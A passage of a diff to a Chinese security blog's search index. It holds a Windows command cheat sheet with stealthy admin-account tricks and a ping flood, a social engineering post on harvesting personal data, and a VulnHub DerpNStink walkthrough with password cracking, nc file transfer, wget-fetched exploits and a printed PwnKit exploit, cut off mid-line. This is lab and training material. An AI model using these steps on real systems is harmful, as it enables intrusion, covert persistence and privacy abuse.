根据在Windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。</p></li><li><p><code>HKEY_CURRENT_USER  </code></p><p>管理系统当前的用户信息; 在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户登录用户名和暂存的密码，在用户登录Windows时，其信息的项拷贝到HKEY_CURRENT_USER中。</p></li><li><p><code>HKEY_LOCAL_MACHINE  </code></p><p>管理当前系统硬件配置; 在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCAL_MACHINE所需的信息，或者在远程计算机中可访问的一组键中。</p></li><li><p><code>HKEY_USERS  </code></p><p>管理系统的用户信息; 这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表，同时每个用户的预配置信息都存储在HKEY_USERS根键中，HKEY_USERS是远程计算机中访问的根键之一。</p></li><li><p><code>HKEY_CURRENT_CONFIG  </code></p><p>管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置如显示器等的数据，该用户使用过的文档列表（MRU）、应用程序配置和其他有关当前用户的Windows中文版安装的信息。</p></li></ul><p>入侵中常用的注册表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY LOCAL MACHINE\software\hzhost\config\settings\mysqlpass</span><br><span class="line">HKEY_LOCAL_MACHINE\software\hzhost\config\settings\mssqlpss</span><br><span class="line">HKEY_LOCAL MACHINE\software\hzhost\config\Settings\mastersvrpass</span><br><span class="line">HKEY LOCAL MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFREEADMIN\11</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\LIWEIWENSOFT\INSTALLFreeHost\11</span><br></pre></td></tr></table></figure><h2 id="常用DOS命令"><a class="header-anchor" href="#常用DOS命令">¶</a>常用DOS命令</h2><h3 id="网络相关"><a class="header-anchor" href="#网络相关">¶</a>网络相关</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 死亡ping,发送大于64K的文件并一直ping就成立死亡ping</span></span><br><span class="line">ping -t -l 65550 ip</span><br><span class="line"><span class="comment"># 以太网连接信息</span></span><br><span class="line">ipconfig /all</span><br><span class="line"><span class="comment"># 释放/重新获取ip</span></span><br><span class="line">ipconfig /release</span><br><span class="line">ipconfig /renew</span><br><span class="line"><span class="comment"># 查看系统信息</span></span><br><span class="line">systeminfo</span><br><span class="line"><span class="comment"># 显示ARP缓存</span></span><br><span class="line">arp -a</span><br><span class="line"><span class="comment"># 查看局域网内其他计算机名称</span></span><br><span class="line">net view</span><br><span class="line"><span class="comment"># 网络连接</span></span><br><span class="line">telnet / ssh</span><br></pre></td></tr></table></figure><h3 id="关机及弹窗命令"><a class="header-anchor" href="#关机及弹窗命令">¶</a>关机及弹窗命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 改变cmd颜色</span></span><br><span class="line">color a</span><br><span class="line"><span class="comment"># 3min后关机并显示hello</span></span><br><span class="line">shutdown -s -t 180 -c <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="comment"># 弹窗命令</span></span><br><span class="line">msg administrator <span class="string">&quot;hello hacker&quot;</span></span><br></pre></td></tr></table></figure><h3 id="文件及目录操作命令"><a class="header-anchor" href="#文件及目录操作命令">¶</a>文件及目录操作命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前目录</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"><span class="comment"># 切换目录</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">test</span></span><br><span class="line"><span class="built_in">cd</span> ../</span><br><span class="line"><span class="comment"># 打开目录/文件/网页</span></span><br><span class="line">start www.baidu.com</span><br><span class="line">start cmd</span><br><span class="line"><span class="comment"># 删除</span></span><br><span class="line">del 1.txt</span><br><span class="line"><span class="comment"># 复制 / 创建文件并写入内容,输入ctrl+z+回车创建成功</span></span><br><span class="line">copy con c:\1.txt</span><br><span class="line"><span class="comment"># 读取文件内容</span></span><br><span class="line"><span class="built_in">type</span> 1.txt</span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line">md <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 删除文件夹</span></span><br><span class="line">rd <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 重命名文件名</span></span><br><span class="line">ren <span class="built_in">test</span> test1</span><br><span class="line"><span class="comment"># 移动文件</span></span><br><span class="line">move 1.txt <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 列出文件树</span></span><br><span class="line">tree</span><br></pre></td></tr></table></figure><h3 id="net命令"><a class="header-anchor" href="#net命令">¶</a>net命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Windows渗透测试中常用命令。比如输入&quot;net use K: \192.168.3.100\c$&quot;，此时磁盘映射多了个C盘</span></span><br><span class="line">net use k:\192.168.1.1\c$</span><br><span class="line"><span class="comment"># 删除刚刚生成的映射</span></span><br><span class="line">net use k:\192.168.1.1\c$ /del</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看开启的服务</span></span><br><span class="line">net start</span><br><span class="line"><span class="comment"># 开启服务</span></span><br><span class="line">net start telnet</span><br><span class="line"><span class="comment"># 停止服务</span></span><br><span class="line">net stop telnet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前有哪些用户</span></span><br><span class="line">net user</span><br><span class="line"><span class="comment"># 建立新用户</span></span><br><span class="line">net user hello /add</span><br><span class="line"><span class="comment"># 修改密码</span></span><br><span class="line">net password</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将用户添加到管理员组中</span></span><br><span class="line">net localGroup administrators <span class="built_in">test</span> /add</span><br><span class="line"><span class="comment"># 查看权限</span></span><br><span class="line">net user <span class="built_in">test</span></span><br><span class="line"><span class="comment"># 查看本地组</span></span><br><span class="line">net localgroup</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活guest用户</span></span><br><span class="line">net user guest /active:<span class="built_in">yes</span></span><br><span class="line"><span class="comment"># 修改guest用户密码</span></span><br><span class="line">net user guest 12345</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看本地开启的共享</span></span><br><span class="line">net share</span><br><span class="line"><span class="comment"># 开启ipc$共享</span></span><br><span class="line">net share ipc$</span><br><span class="line">net share ipc$ /del</span><br><span class="line"><span class="comment"># 删除C盘共享</span></span><br><span class="line">net share c$ /del</span><br></pre></td></tr></table></figure><blockquote><p><code>Remote Desktop Users</code>为远程桌面组, 绕过安全狗可能会遇到该组; 下图展示了将其添加到远程桌面组的代码<code>net localgroup &quot;remote desktop users&quot; xiao /add</code></p></blockquote><p>服务器提权不建议创建用户, 尽量避免管理员看到新增用户, 可以启用guest并创建密码, 再增加到管理员组或远程桌面组, 相对比直接创建用户更隐蔽</p><h3 id="netstat命令"><a class="header-anchor" href="#netstat命令">¶</a>netstat命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看开启了哪些端口</span></span><br><span class="line">netstart -a</span><br><span class="line"><span class="comment"># 查看端口的网络连接情况</span></span><br><span class="line">netstat -n</span><br><span class="line"><span class="comment"># 查看正在进行的工作</span></span><br><span class="line">netstat -v</span><br><span class="line"><span class="comment"># 显示网络连接,路由表和网络接口信息</span></span><br><span class="line">netstat -an</span><br><span class="line"><span class="comment"># 查看系统进程 </span></span><br><span class="line">tasklist</span><br><span class="line"><span class="comment"># 调用结束进程</span></span><br><span class="line">taskkill /im cmd.exe</span><br><span class="line"><span class="comment"># 网络工具,常用于创建无线连接</span></span><br><span class="line">netsh</span><br><span class="line">netsh wlan <span class="built_in">set</span> hostednetwork mode=allow ssid=cc key=1122334455</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Web知识 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Windows </tag>
             
         </tags>
       
@@ -770,31 +899,6 @@
     
     
     <entry>
-      <title>社会工程学</title>
-      <link href="/article/social-engineering/"/>
-      <url>/article/social-engineering/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>社会工程学</h1><hr><h2 id="原因"><a class="header-anchor" href="#原因">¶</a>原因</h2><p>相对于防守严密的系统, 人是系统中最薄弱的部分</p><p>互联网的普及使得更多的&quot;易骗人群&quot;可以接触网络, 而我们可以从他们那里获取敏感信息; 我们常常戏称村口大妈是这个村的&quot;情报网&quot;, 因为很简单就能从她们嘴里套出信息. 互联网何尝不是一个巨大的&quot;村&quot;, 我们需要的是找到&quot;大妈&quot;从而获取目标的信息</p><h2 id="本质"><a class="header-anchor" href="#本质">¶</a>本质</h2><p>收集个人/集体在互联网上产生的痕迹并加以利用</p><p>如果和受害者产生交互, 那就增加: 欺骗的艺术</p><h2 id="分类"><a class="header-anchor" href="#分类">¶</a>分类</h2><p>社会工程学攻击包括四个阶段:</p><ul><li>制作鱼饵：信息收集, 确定目标并对目标的信息进行汇总</li><li>下杆：与目标建立第一次交谈(HOOK, 下套)</li><li>上钩：与目标建立信任并获取信息</li><li>退场：不引起目标怀疑的离开现场</li></ul><p>通常社会工程学攻击可以划分为两类:</p><ul><li>基于人的社工</li><li>基于计算机的社工</li></ul><blockquote><p>书籍: 《我是谁，没有绝对的安全》</p></blockquote><p>常见可获取信息系统包括: 中航信系统, 春秋航空系统, 12306系统, 三大运营商网站, 全国人口基本信息资源库, 全国机动车/驾驶人信息资源库, 各大快递系统(越权), 全国出入境人员资源库, 全国在逃人员信息资源库, 企业相关系统, 全国安全重点单位信息资源库等</p><p>常用方式: 网络钓鱼, 电话钓鱼, 伪装模拟常用工具: 搜索引擎例如google(google hacker), 公开/私密社工库, QQ</p><h2 id="常见方法"><a class="header-anchor" href="#常见方法">¶</a>常见方法</h2><h3 id="交流模型"><a class="header-anchor" href="#交流模型">¶</a>交流模型</h3><p>即谈话/交流, 社工就是利用这些语言和非语言的潜在信息, 改变/影响目标的感知, 从而得到想要的结果</p><h3 id="网络钓鱼"><a class="header-anchor" href="#网络钓鱼">¶</a>网络钓鱼</h3><p>最常见的方法, 利用该方法可以向某个特定的目标系统发起攻击</p><p>利用目标或者是与目标相关的兴趣爱好或是直接基于身份信息精心设计鱼饵, 鱼饵通常是一个包含木马的文件, 一个伪造的网页</p><p>最终目的基本都是控制主机并将其作为跳板</p><h3 id="信息刺探"><a class="header-anchor" href="#信息刺探">¶</a>信息刺探</h3><p>其实就是公开信息收集, 越详细越好</p><h2 id="详细方法"><a class="header-anchor" href="#详细方法">¶</a>详细方法:</h2><p>这里主要是信息刺探, 交流模型更应该归类于心理学, 因为获取更多信息必须与受害者交流/监听, 而网络钓鱼需要更多的代码与安全基础(其实是这俩都游走在法律边缘)</p><h3 id="从IP入手"><a class="header-anchor" href="#从IP入手">¶</a>从IP入手</h3><p>常见的通过IP可收集到的基础信息:</p><ul><li>网站本身: 域名, IP地址, 有无CDN, 编程语言, 是否存在WAF(Web应用防护系统)</li><li>网站服务器: 端口, 操作系统, 指纹框架, Web容器</li><li>其他信息: 旁站信息, 信息泄露查询, nmap查询IP地址拓扑图, 网络权重</li></ul><p>然后可以继续收集其他资料</p><ul><li>可以利用IP物理定位确定大致位置</li><li>可以用Whois查询域名的所有人, 注册商, 邮件, 电话号码等(只有邮箱也可以邮件反查域名)</li></ul><h3 id="从社交信息入手"><a class="header-anchor" href="#从社交信息入手">¶</a>从社交信息入手</h3><p>通过各大网站已知有价值的ID获取其他信息(如电话号码, QQ, 微信), 通过电话或QQ获取用户的登录账号</p><ul><li>社工库qq查手机或反查等等</li><li>通过邮箱获取注册过的网站</li><li>密码找回获得手机号部分信息, 可以结合不同城市的手机号段获取大部分手机号, 剩下的就是爆破了</li><li>个人的空间和平台上的言论</li><li>直接利用社交媒体添加目标, 套话</li></ul><blockquote><p>可能需要一些虚拟号码和虚拟邮箱</p></blockquote><h3 id="可能的方式"><a class="header-anchor" href="#可能的方式">¶</a>可能的方式</h3><ol><li>有的手机拍照后会在图片中写入GPS信息, 而且是默认开启的; 此时查看照片的详细信息的时候可以看到GPS信息</li><li>同一个人多个不同平台可能用的同样的账号密码, 甚至弱密码</li></ol>]]></content>
-      
-      
-      <categories>
-          
-          <category> Web知识 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> 社会工程学 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Jangow-1-01</title>
       <link href="/article/Jangow-1-01/"/>
       <url>/article/Jangow-1-01/</url>
@@ -811,9 +915,9 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> 反弹shell </tag>
             
@@ -869,9 +973,9 @@
       
         <tags>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> RCE </tag>
             
@@ -912,9 +1016,9 @@
             
             <tag> MySQL </tag>
             
-            <tag> PHP </tag>
-            
             <tag> 绕过 </tag>
+            
+            <tag> PHP </tag>
             
             <tag> SQL注入 </tag>
             
@@ -982,9 +1086,9 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1015,9 +1119,9 @@
       
         <tags>
             
-            <tag> Linux </tag>
-            
             <tag> 提权 </tag>
+            
+            <tag> Linux </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1046,11 +1150,11 @@
       
         <tags>
             
+            <tag> 提权 </tag>
+            
             <tag> Linux </tag>
             
             <tag> 工具利用 </tag>
-            
-            <tag> 提权 </tag>
             
             <tag> MySQL </tag>
             
@@ -1081,15 +1185,15 @@
       
         <tags>
             
+            <tag> 提权 </tag>
+            
             <tag> Linux </tag>
             
-            <tag> 提权 </tag>
+            <tag> MySQL </tag>
             
             <tag> 漏洞利用 </tag>
             
             <tag> 文件上传 </tag>
-            
-            <tag> MySQL </tag>
             
             <tag> 绕过 </tag>
             
@@ -1120,11 +1224,11 @@
       
         <tags>
             
+            <tag> 提权 </tag>
+            
             <tag> Linux </tag>
             
             <tag> 缓冲区溢出 </tag>
-            
-            <tag> 提权 </tag>
             
             <tag> 漏洞利用 </tag>
             
@@ -1145,7 +1249,7 @@
       <link href="/article/DerpNStink-1/"/>
       <url>/article/DerpNStink-1/</url>
       
-        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>DerpNStink-1</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/derpnstink-1,221/">vulnhub靶场-DerpNStink:1</a></p><p>目标: attack the VM and find all 4 flags eventually leading you to full root access</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>ubuntu: 192.168.56.10</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.10</span><br><span class="line">nmap -A 192.168.56.10</span><br></pre></td></tr></table></figure><p>结合工具以及访问网页, 可以收集一些信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 端口: </span><br><span class="line">21,22,80,3306</span><br><span class="line"># 中间件: </span><br><span class="line">apache/2.4.7</span><br><span class="line">MySQL</span><br><span class="line">jQuery</span><br><span class="line">PHP</span><br><span class="line"># 操作系统: </span><br><span class="line">Ubuntu 2ubuntu2.8</span><br><span class="line"># cms: </span><br><span class="line">WordPress</span><br><span class="line"># 目录扫描: </span><br><span class="line">/php/phpmyadmin</span><br><span class="line">/robots.txt</span><br><span class="line">/temporary/        # 仅仅输出tryharder</span><br><span class="line">/weblog</span><br><span class="line">/weblog/wp-admin</span><br></pre></td></tr></table></figure><p>直接访问80端口, 可以在网页中搜索找到flag1, 还找到一个<code>/webnotes/info.txt</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240924204439528.png" alt="image-20240924204439528"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;-- @stinky, make sure to update your hosts file with local dns so the new derpnstink blog can be reached before it goes live --&gt; </span><br><span class="line"># 需要修改host文件</span><br></pre></td></tr></table></figure><p>WordPress后台有弱密码, 账号密码均为<code>admin</code></p><p>先配置hosts文件, 你问我网址怎么来的, 我说windows登录后得到的, 或者linux访问<code>/weblog/wp-admin</code>得到的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.56.10    derpnstink.local</span><br></pre></td></tr></table></figure><p>利用漏洞扫描工具进一步扫描(kali自带的wpscan), 利用kali搜索漏洞:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://derpnstink.local/weblog/</span><br><span class="line"># 找到过时插件: slideshow-gallery 1.4.8</span><br><span class="line"># 有cms主题 twentysixteen</span><br><span class="line"></span><br><span class="line">search WordPress 4.6</span><br><span class="line"># 这不一眼看到slideshowgallery_upload</span><br><span class="line"># 我没有在搜索引擎找到对应的编号</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925193308091.png" alt="image-20240925193308091"></p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/unix/webapp/wp_slideshowgallery_upload</span><br><span class="line">set rhosts 192.168.56.10</span><br><span class="line">set targeturi /weblog</span><br><span class="line">set wp_password admin</span><br><span class="line">set wp_user admin</span><br><span class="line"># 记得看 lhost 是否正确, 下图就是因为没有设置 lhost 上传了一堆</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925194854979.png" alt="image-20240925194854979"></p><p>继续信息收集:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 用户 whoami</span><br><span class="line">www-data</span><br><span class="line"># 系统内核 uname -a </span><br><span class="line">Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span><br><span class="line"># 环境</span><br><span class="line">gcc</span><br><span class="line"># 配置文件 /var/www/html/weblog/wp-config.php</span><br><span class="line">mysql账密: root mysql</span><br><span class="line">库名: wordpress</span><br></pre></td></tr></table></figure><blockquote><p><code>lsb_release -a</code> 查看发行版本</p><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看有suid权限的文件</p></blockquote><p>进入mysql收集信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use wordpress</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_users;</span><br></pre></td></tr></table></figure><p>可以找到最后一列是flag2, 但是没有值, 猜测是另一个账号登录获取flag2</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925200926303.png" alt="image-20240925200926303"></p><p>结果在<code>wp_posts</code>数据库中找到了flag2, 那挺好的</p><blockquote><p>爆破密钥的话可以利用kali的<code>john</code>工具, 将要爆破的写进pass.txt进行爆破; rockyou.txt可以去到这个目录下解压<code>rockyou.txt.gz</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"><span class="comment"># unclestinky/wedgie57  登录wordpress获得flag2</span></span><br></pre></td></tr></table></figure></blockquote><p>现在只剩下21和22没有试过了, 但是发现登录需要账号密码</p><p>获取用户名可以<code>cat /etc/passwd</code>, 也可以前往<code>/home</code>查看有谁的配置文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户: mrderp, stinky</span></span><br><span class="line">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.56.10 ftp</span><br><span class="line"><span class="comment"># 爆破拿到ftp账密: stinky wedgie57</span></span><br></pre></td></tr></table></figure><blockquote><p>发现这一套账号密码也可以直接用于<code>su stinky</code></p><p>主要是我在ftp里面找不到东西</p></blockquote><p>利用<code>su stinky</code>登录对应账号, 在此权限下进入<code>/home/stinky/Desktop</code>找到flag.txt, 这是flag3</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240925205624768.png" alt="image-20240925205624768"></p><p>三个都找到了, 结合靶机描述, 下一步我们应该提权</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><blockquote><p>耗时最久的一集</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 14.04, 测试半天没有任何收获</span><br></pre></td></tr></table></figure><p>遂用搜索引擎寻找新的方法: <a href="https://942178v2gb.k.topthink.com/@k7pl99lypy/Ubuntuneihetiquan.html">Ubuntu内核提权-Xe的库</a></p><p>已经测试的: <code>CVE-2017-16995</code>(45010.c), <code>CVE-2021-3493</code>(37292.c)</p><p>2021这么新都不行, 向后找<a href="http://1.13.190.198/2022/04/07/CVE-2021-4034/">CVE-2021-4034：Linux Polkit 权限提升漏洞复现以及修复</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://192.168.56.6:6789/cve-2021-4034.c</span><br><span class="line"><span class="built_in">chmod</span> 777 cve-2021-4034.c</span><br><span class="line">gcc cve-2021-4034.c -o poc</span><br><span class="line"><span class="built_in">chmod</span> 777 poc</span><br><span class="line">./poc</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145559032.png" alt="image-20240926145559032"></p><p>然后进入<code>/root</code>, 在Desktop下找到flag4, 圆满完成任务</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926145704769.png" alt="image-20240926145704769"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>去找了其他大佬的博客, 我们似乎用不同的方法跳过了不少步骤</p><h3 id="ftp中有公钥文件"><a class="header-anchor" href="#ftp中有公钥文件">¶</a>ftp中有公钥文件</h3><p>在<code>/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh</code>下有一个key.txt</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get key.txt    # 下载到本地</span><br></pre></td></tr></table></figure><p>利用这个密钥可以登录前面找到的两个账户</p><p>如果出现 Permissions 0664 for ‘key.txt’ are too open, 就把权限设为400</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> 400 key.txt   <span class="comment"># -rwx</span></span><br><span class="line">ssh -i key.txt stinky@192.168.159.136 -o PubkeyAcceptedKeyTypes=+ssh-rsa</span><br><span class="line"><span class="comment"># 此处两个我都无法登录</span></span><br></pre></td></tr></table></figure><h3 id="ftp中还有聊天文件"><a class="header-anchor" href="#ftp中还有聊天文件">¶</a>ftp中还有聊天文件</h3><p><code>/files/network-logs/</code>下还有<code>derpissues.txt</code></p><p>在这里可以看到通过数据包捕获工具进行问题排查, 那就是排查我们的到的那个数据包</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">12:06 mrderp: hey i cant login to wordpress anymore. Can you look into it?</span><br><span class="line">12:07 stinky: yeah. did you need a password reset?</span><br><span class="line">12:07 mrderp: I think i accidently deleted my account</span><br><span class="line">12:07 mrderp: i just need to logon once to make a change</span><br><span class="line">12:07 stinky: im gonna packet capture so we can figure out whats going on</span><br><span class="line">12:07 mrderp: that seems a bit overkill, but wtv</span><br><span class="line">12:08 stinky: commence the sniffer!!!</span><br><span class="line">12:08 mrderp: -_-</span><br><span class="line">12:10 stinky: fine derp, i think i fixed it for you though. cany you try to login?</span><br><span class="line">12:11 mrderp: awesome it works!</span><br><span class="line">12:12 stinky: we really are the best sysadmins #team</span><br><span class="line">12:13 mrderp: i guess we are…</span><br><span class="line">12:15 mrderp: alright I made the changes, feel free to decomission my account</span><br><span class="line">12:20 stinky: done! yay</span><br></pre></td></tr></table></figure><h3 id="strinky的Documents中有流量日志"><a class="header-anchor" href="#strinky的Documents中有流量日志">¶</a>strinky的Documents中有流量日志</h3><p>传递文件:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali:</span></span><br><span class="line">nc -lvvp 1234 &gt; derpissues.pcap</span><br><span class="line"><span class="comment"># 靶机:</span></span><br><span class="line">nc -nv 192.168.56.6 1234 &lt; derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926152420545.png" alt="image-20240926152420545"></p><p>分析文件, 在http过滤器下找到No.5598数据包(POST, 而且是创建新用户)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wireshark derpissues.pcap</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926155413165.png" alt="image-20240926155413165"></p><p>尝试用这个密码去登录用户, 成功登录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh mrderp@192.168.56.10</span><br><span class="line">derpderpderpderpderpderpderp</span><br></pre></td></tr></table></figure><h3 id="mrderp的Desktop下有提权方式"><a class="header-anchor" href="#mrderp的Desktop下有提权方式">¶</a>mrderp的Desktop下有提权方式</h3><p>有一个<code>helpdesk.log</code>, 里面有提示:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926160236163.png" alt="image-20240926160236163"></p><p>这个网址在访问后有一句话:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</span><br></pre></td></tr></table></figure><p>也就是允许mrderp用户在主机上以root用户权限读写执行/home/mrderp/binaries/目录下derpy开头的文件</p><blockquote><p>其实<code>sudo -l</code>可以显示当前用户在使用sudo命令时的权限和限制, 和上面得到的相同</p></blockquote><p>没有这个目录就去创建这个目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> binaries</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt;&gt; derpy.sh</span><br><span class="line"><span class="built_in">chmod</span> 777 derpy.sh</span><br><span class="line">sudo ./derpy.sh</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240926183631782.png" alt="image-20240926183631782"></p><h3 id="扒拉过来的py提权文件"><a class="header-anchor" href="#扒拉过来的py提权文件">¶</a>扒拉过来的py提权文件</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#  CVE-2021-4034</span></span><br><span class="line"><span class="comment">#  Ravindu Wickramasinghe (@rvizx9)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"></span><br><span class="line">so=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void gconv() &#123;&#125;</span></span><br><span class="line"><span class="string">void gconv_init() &#123;</span></span><br><span class="line"><span class="string">    setuid(0);setgid(0);seteuid(0);setegid(0);</span></span><br><span class="line"><span class="string">    system(&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#x27;GCONV_PATH=.&#x27; &#x27;pwnkit&#x27;; /bin/sh&quot;);</span></span><br><span class="line"><span class="string">    exit(0);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    os.system(<span class="string">&quot;mkdir -p &#x27;GCONV_PATH=.&#x27; pwnkit ; touch &#x27;GCONV_PATH=./pwnkit&#x27;; chmod a+x &#x27;GCONV_PATH=./pwnkit&#x27;&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;echo &#x27;module UTF-8// PWNKIT// pwnkit 2&#x27; &gt; pwnkit/gconv-modules&quot;</span>)</span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&quot;pwnkit/pwnkit.c&quot;</span>,<span class="string">&quot;w&quot;</span>) ; f.write(so) ;f.close()</span><br><span class="line">    os.system(<span class="string">&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;</span>)</span><br><span class="line">    envi=[<span class="string">b&quot;pwnkit&quot;</span>, <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,<span class="string">b&quot;CHARSET=PWNKIT&quot;</span>,<span class="string">b&quot;SHELL=pwnkit&quot;</span>,<span class="literal">None</span>]</span><br><span class="line">    env=(c_char_p * <span class="built_in">len</span>(envi))() ;env[:]=envi</span><br><span class="line">    libc = CDLL(find_library(<span class="string">&#x27;c&#x27;</span>))</span><br><span class="line">    libc.execve(<span 